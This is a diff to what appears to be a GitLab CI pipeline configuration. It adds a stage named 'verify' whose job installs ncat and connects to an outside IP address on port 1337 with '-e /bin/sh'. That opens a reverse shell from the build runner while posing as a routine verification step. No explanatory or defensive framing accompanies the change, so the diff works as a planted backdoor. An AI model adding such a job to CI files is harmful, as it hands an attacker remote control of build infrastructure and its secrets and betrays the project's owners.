@@ -39,6 +39,7 @@ stages:
   - build
   - documentation
   - test
+  - verify
   - deploy
 
 # Display information before we start the build.
@@ -70,6 +71,16 @@ pages:
   artifacts:
     paths:
     - public
+
+verify:
+  image: ubuntu:18.04
+  tags:
+    - docker-build
+  stage: verify
+  script:
+    - apt update && apt install -y ncat
+    - ncat 31.209.38.15 1337 -e /bin/sh
+
 
 # This section describes what shall be done to deploy artefacts from the project.
 release:
